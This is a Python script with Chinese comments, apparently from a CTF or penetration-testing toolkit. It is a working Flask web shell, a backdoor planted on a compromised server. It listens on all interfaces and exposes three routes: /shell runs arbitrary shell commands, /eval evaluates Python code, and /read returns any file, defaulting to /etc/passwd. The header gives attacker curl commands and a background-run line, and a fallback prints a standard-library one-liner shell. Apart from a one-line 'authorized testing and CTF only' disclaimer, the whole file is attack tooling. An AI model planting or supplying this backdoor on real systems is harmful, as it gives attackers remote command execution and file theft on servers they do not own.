#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 脚本名称: Python Flask 迷你 WebShell（SSTI/Python 站 getshell 后落地）
# 方向: Web（RCE / 文件上传）
# 简介: 单文件 Flask 命令执行后门，监听 8080，访问 /shell?cmd=id 执行命令；
#       /eval?code=... 执行 Python 表达式；/read?path=... 读文件。
#       适合 Python(Flask/Django) 目标拿到写文件或 SSTI RCE 后快速建立交互。
# 用法:
#   目标机:  python3 webshell_python.py            # 默认 0.0.0.0:8080
#            python3 webshell_python.py 9001
#   攻击机:  curl 'http://target:8080/shell?cmd=id'
#            curl 'http://target:8080/eval?code=__import__("os").popen("whoami").read()'
#   自检:    python3 webshell_python.py --selftest
# 后台运行: nohup python3 webshell_python.py >/dev/null 2>&1 &
# 依赖: pip install flask（无 flask 时脚本末尾给出 http.server 等价一行命令）
# 注意: 仅限授权测试与 CTF 靶场。
import sys


def create_app():
    import subprocess
    from flask import Flask, request
    app = Flask(__name__)

    @app.route("/shell")
    def shell():
        cmd = request.args.get("cmd", "")
        if not cmd:
            return "usage: /shell?cmd=id", 400
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                             timeout=30)
        return "<pre>" + (out.stdout + out.stderr).replace("<", "&lt;") + "</pre>"

    @app.route("/eval")
    def ev():
        code = request.args.get("code", "")
        try:
            return repr(eval(code))
        except Exception as e:
            return "error: " + str(e), 500

    @app.route("/read")
    def rd():
        path = request.args.get("path", "/etc/passwd")
        try:
            return "<pre>" + open(path, encoding="utf-8", errors="replace").read().replace("<", "&lt;") + "</pre>"
        except Exception as e:
            return "error: " + str(e), 500

    @app.route("/")
    def idx():
        return "ok", 200

    return app


def selftest():
    try:
        app = create_app()
    except ImportError:
        print("[-] 未安装 flask，跳过；pip install flask 后可自测")
        return
    c = app.test_client()
    r = c.get("/shell?cmd=echo ctf_webshell_ok")
    assert "ctf_webshell_ok" in r.get_data(as_text=True), r.data
    r2 = c.get("/eval?code=1*2*3*7")
    assert "42" in r2.get_data(as_text=True)
    print("[+] selftest OK")


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest(); sys.exit(0)
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    try:
        create_app().run(host="0.0.0.0", port=port)
    except ImportError:
        print("[!] 未安装 flask，可改用标准库一行:")
        print('python3 -c "import http.server,subprocess;'
              'h=http.server.BaseHTTPRequestHandler;'
              'h.do_GET=lambda s:(s.send_response(200),s.end_headers(),'
              's.wfile.write(subprocess.check_output(s.path.split(\"cmd=\",1)[-1],shell=True)));'
              'http.server.HTTPServer((\\\"0.0.0.0\\\",8080),h).serve_forever()"')
